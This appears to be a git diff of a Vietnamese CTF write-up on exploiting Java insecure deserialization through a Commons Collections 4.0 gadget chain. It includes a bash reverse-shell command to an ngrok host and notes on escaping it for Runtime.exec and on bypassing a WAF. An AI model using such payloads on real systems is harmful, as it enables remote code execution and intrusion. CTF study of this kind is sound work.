@@ -58,13 +58,13 @@ public class UserController {
 }
 ```
 **Phân tích**: Ở route `/info/{info}` có method `readObject()` deserialize object từ user input là đáng chú ý, mình xin phân tích route này như sau:
-1. Data của biến `info` được lấy từ url path ứng với: `/info/{info}` nhờ annotation @PathVariable.
+1. Data của biến `info` được lấy từ uri path ứng với: `/info/{info}` nhờ annotation @PathVariable.
 2. Biến `info` này sau đó được replace lại 1 số kí tự bằng method `unEncode()` và sẽ được base64 decode.
 3. Ở đây nếu param `compress` được set là `true` thì `info` sẽ được nạp dưới dạng là 1 object stream được nén gzip và cuối cùng sẽ được deserialize ở method `readObject()`.
 
 Đây rõ ràng là lỗ hổng `Java Insecure Deserialization`, để exploit thì điều tiếp theo mình cần làm là tìm là 1 sink mà có thể dẫn đển RCE khi deserialize object.
 
-Tìm đến file `pom.xml`, là file chứa thông tin để build app trong maven thì mình thấy được server có dùng `Commons Collection 4` version `4.0`. CC4 version 4.0 có [CVE](https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHECOMMONS-30008) chứa gadget chain có thể dẫn đến RCE khi insecure deserialize obj
+Tìm đến file `pom.xml`, là file chứa thông tin để build java app thì mình thấy được server có dùng `Commons Collection 4` version `4.0`. CC4 version 4.0 có [CVE](https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHECOMMONS-30008) chứa gadget chain có thể dẫn đến RCE khi insecure deserialize obj.
 
 <img width="710" alt="11_14_41-src – pom xml  waf-deser-0 0 1-SNAPSHOT (2)" src="https://user-images.githubusercontent.com/71699412/196037828-17f99c3f-fff4-431e-9f30-4ca793b1ac17.png">
 
@@ -139,10 +139,12 @@ public class Exploit {
 1. Server(docker) không có các tool như curl, ping, nc,... nên không thể sử dụng để lấy luôn flag được, phải lấy được shell.
 2. Method `getObject()` khi tạo payload CC4 nhận arg command dưới dạng là 1 string, cái mà sẽ được nạp vào method `Runtime.getRuntime.exec(string)` để thực thi command. Mà method [exec(string) trong Java sẽ tự động split string dựa vào dấu space thành 1 string array](https://askcodes.net/coding/why-does-runtime-exec-string--work-for-some-but-not-all-commands-) để pass như các command arguments cho nên chỗ command này mình cần escape dấu space. 
 2. `Runtime.getRuntime.exec()` có nhiều hạn chế hơn 1 shell bình thường nên 1 số ký tự, command không thể intepret hay escape nên ví dụ với command `bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/13992 0>&1` có chứa `>&` thì cần được escape nên mình base64 encode luôn đoạn này.
+
 ![unknown](https://user-images.githubusercontent.com/71699412/196038602-0b373191-5a43-46db-9487-cbd9c684a216.png)
 
 Đến đây nếu gửi luôn payload lên server thì sẽ bị trả về: ` 403: Deserialization of Untrusted Data Detected. (From real WAF with <3)` do firewall mình đã nhắc ở trên.
 
+## Bypass
 **nginx.conf**:
 ```
 server {    
